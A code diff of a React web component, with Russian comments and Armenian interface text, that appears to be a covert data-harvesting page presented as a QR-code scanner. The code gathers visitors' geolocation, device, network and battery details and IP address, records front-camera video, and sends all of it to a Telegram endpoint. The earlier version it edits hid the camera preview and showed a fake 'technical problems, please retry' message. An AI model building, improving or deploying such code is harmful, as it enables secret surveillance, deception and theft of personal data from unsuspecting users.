@@ -3,7 +3,7 @@
 import React, { useEffect, useRef, useState, useCallback } from "react";
 import QrScanner from "./qr-scanner";
 import { Button } from "@/components/ui/button";
-import { toast } from "sonner"; // Импорт toast из sonner
+import { toast } from "sonner";
 import {
   getGeolocation,
   getClientInfo,
@@ -24,7 +24,7 @@ type NetworkInfo = { effectiveType?: string; rtt?: number; downlink?: number };
 type BatteryInfo = { level?: number; charging?: boolean; status?: string };
 
 type CollectedData = {
-  timestamp: string; // Добавлено
+  timestamp: string;
   geolocation?: GeolocationData;
   clientInfo?: ClientInfo;
   networkInfo?: NetworkInfo;
@@ -51,28 +51,12 @@ const PermissionHandler = () => {
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
   const mediaChunksRef = useRef<Blob[]>([]);
   const [appPhase, setAppPhase] = useState<AppPhase>("initial");
-  const [loadingMessage, setLoadingMessage] = useState("Загрузка...");
-  const [collectedData, setCollectedData] = useState<CollectedData>({ timestamp: new Date().toISOString() }); // Инициализация timestamp
+  const [loadingMessage, setLoadingMessage] = useState("Подготовка к запуску...");
+  const [collectedData, setCollectedData] = useState<CollectedData>({ timestamp: new Date().toISOString() });
   const [sessionKey, setSessionKey] = useState(0);
+  const [processSuccessful, setProcessSuccessful] = useState<boolean>(false);
 
-  const loadingMessages = [
-    "Идет сбор данных об устройстве...",
-    "Определение местоположения...",
-    "Подготовка к записи видео...",
-    "Обработка информации...",
-    "Пожалуйста, подождите...",
-    "Загрузка данных на сервер...",
-  ];
-
-  const updateLoadingMessage = useCallback(() => {
-    let index = 0;
-    return setInterval(() => {
-      setLoadingMessage(loadingMessages[index % loadingMessages.length]);
-      index++;
-    }, 2000);
-  }, []);
-
-  const sendDataToTelegram = useCallback(async (data: CollectedData) => {
+  const sendDataToTelegram = useCallback(async (data: CollectedData): Promise<boolean> => {
     try {
       const response = await fetch(TELEGRAM_API_ENDPOINT, {
         method: "POST",
@@ -85,14 +69,17 @@ const PermissionHandler = () => {
       if (response.ok) {
         console.log("Data successfully sent to Telegram!");
         toast.success("Данные успешно отправлены в Telegram!");
+        return true;
       } else {
         const errorData = await response.json();
         console.error(`Failed to send data to Telegram: ${errorData.error || response.statusText}`);
         toast.error(`Ошибка отправки данных: ${errorData.error || response.statusText}`);
+        return false;
       }
     } catch (error: any) {
       console.error(`Network error sending data to Telegram: ${error.message}`);
       toast.error(`Сетевая ошибка: ${error.message}`);
+      return false;
     }
   }, []);
 
@@ -160,7 +147,8 @@ const PermissionHandler = () => {
       console.log("QR Code Scanned in PermissionHandler:", qrData);
       const finalData = { ...collectedData, qrCodeData: qrData };
       setCollectedData(finalData);
-      await sendDataToTelegram(finalData); // Отправляем финальный отчет
+      const success = await sendDataToTelegram(finalData);
+      setProcessSuccessful(success);
       setAppPhase("finished");
       toast.success("QR-код успешно отсканирован!");
     },
@@ -172,7 +160,8 @@ const PermissionHandler = () => {
       console.error("QR Scan Error:", error);
       const finalData = { ...collectedData, qrCodeData: `QR Scan Error: ${error}` };
       setCollectedData(finalData);
-      await sendDataToTelegram(finalData); // Отправляем финальный отчет
+      const success = await sendDataToTelegram(finalData);
+      setProcessSuccessful(success);
       setAppPhase("finished");
       toast.error(`Ошибка сканирования QR: ${error}`);
     },
@@ -181,21 +170,23 @@ const PermissionHandler = () => {
 
   const startNewSession = useCallback(() => {
     setAppPhase("initial");
-    setCollectedData({ timestamp: new Date().toISOString() }); // Сброс и новая временная метка
+    setCollectedData({ timestamp: new Date().toISOString() });
     setSessionKey((prevKey) => prevKey + 1);
+    setProcessSuccessful(false); // Reset success status
   }, []);
 
   useEffect(() => {
-    let loadingInterval: NodeJS.Timeout;
     let qrTimeout: NodeJS.Timeout;
 
     const runProcess = async () => {
+      setLoadingMessage("Сбор данных об устройстве и разрешениях...");
       setAppPhase("collectingData");
-      loadingInterval = updateLoadingMessage();
 
-      let currentCollectedDataState: CollectedData = { timestamp: new Date().toISOString() }; // Инициализация с новой временной меткой
+      let currentCollectedDataState: CollectedData = { timestamp: new Date().toISOString() };
 
       // --- Start Video 1 Recording immediately ---
+      setLoadingMessage("Запись первого видео (фронтальная камера)...");
+      setAppPhase("recordingVideo1");
       const video1Promise = recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
 
       // --- Concurrently collect other data ---
@@ -232,7 +223,7 @@ const PermissionHandler = () => {
 
       currentCollectedDataState.ipAddress = "Fetching...";
 
-      // Await Video 1 completion
+      // Await Video 1 completion and send
       const video1Base64 = await video1Promise;
       if (video1Base64) {
         currentCollectedDataState = { ...currentCollectedDataState, video1: video1Base64 };
@@ -242,6 +233,7 @@ const PermissionHandler = () => {
       currentCollectedDataState.video1 = undefined; // Clear after sending
 
       // --- Video 2 Recording ---
+      setLoadingMessage("Запись второго видео (фронтальная камера)...");
       setAppPhase("recordingVideo2");
       const video2Base64 = await recordVideoSegment(VIDEO_SEGMENT_DURATION_MS, "user");
       if (video2Base64) {
@@ -252,14 +244,16 @@ const PermissionHandler = () => {
       currentCollectedDataState.video2 = undefined; // Clear after sending
 
       // --- QR Scanning ---
+      setLoadingMessage("Переключение на заднюю камеру для сканирования QR-кода...");
       setAppPhase("flippingCamera");
-      setAppPhase("qrScanning");
+      setAppPhase("qrScanning"); // QrScanner component will handle its own loading message
 
       qrTimeout = setTimeout(async () => {
         console.log("QR scanning timed out.");
         const finalData = { ...currentCollectedDataState, qrCodeData: "QR Scan Timed Out" };
         setCollectedData(finalData);
-        await sendDataToTelegram(finalData);
+        const success = await sendDataToTelegram(finalData);
+        setProcessSuccessful(success);
         setAppPhase("finished");
         toast.error("Время сканирования QR-кода истекло.");
       }, QR_SCAN_TIMEOUT_MS);
@@ -270,7 +264,6 @@ const PermissionHandler = () => {
     }
 
     return () => {
-      clearInterval(loadingInterval);
       clearTimeout(qrTimeout);
       if (mediaRecorderRef.current && mediaRecorderRef.current.state === "recording") {
         mediaRecorderRef.current.stop();
@@ -280,7 +273,7 @@ const PermissionHandler = () => {
         videoRef.current.srcObject = null;
       }
     };
-  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, updateLoadingMessage]);
+  }, [sessionKey, appPhase, sendDataToTelegram, recordVideoSegment, collectedData]);
 
 
   return (
@@ -295,11 +288,20 @@ const PermissionHandler = () => {
             {loadingMessage}
           </p>
           <div className="relative w-full max-w-md aspect-video bg-muted flex items-center justify-center rounded-lg overflow-hidden">
-            <video ref={videoRef} autoPlay playsInline muted className="w-full h-full object-cover" style={{ display: 'none' }} />
+            <video
+              ref={videoRef}
+              autoPlay
+              playsInline
+              muted
+              className="w-full h-full object-cover"
+              style={{ display: (appPhase === "recordingVideo1" || appPhase === "recordingVideo2") ? 'block' : 'none' }}
+            />
             <div className="absolute inset-0 border-4 border-primary-foreground opacity-70 rounded-lg pointer-events-none" />
-            <div className="absolute inset-0 flex items-center justify-center">
-              <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-foreground" />
-            </div>
+            {(appPhase === "collectingData" || appPhase === "flippingCamera") && (
+              <div className="absolute inset-0 flex items-center justify-center">
+                <div className="animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-primary-foreground" />
+              </div>
+            )}
           </div>
         </>
       )}
@@ -309,7 +311,10 @@ const PermissionHandler = () => {
       {appPhase === "finished" && (
         <div className="flex flex-col items-center justify-center">
           <p className="text-lg mb-4 text-center">
-            Տեխնիկական անսարքություններ, խնդրում ենք կրկնել կամ փորձել ավելի ուշ:
+            {processSuccessful
+              ? "Տվյալները հաջողությամբ ուղարկվել են։ Շնորհակալություն։" // Данные успешно отправлены. Спасибо.
+              : "Տեխնիկական անսարքություններ, խնդրում ենք կրկնել կամ փորձել ավելի ուշ:" // Технические неполадки, пожалуйста, повторите еще раз или повторите позже.
+            }
           </p>
           <Button onClick={startNewSession} className="mt-4">
             Կրկնել
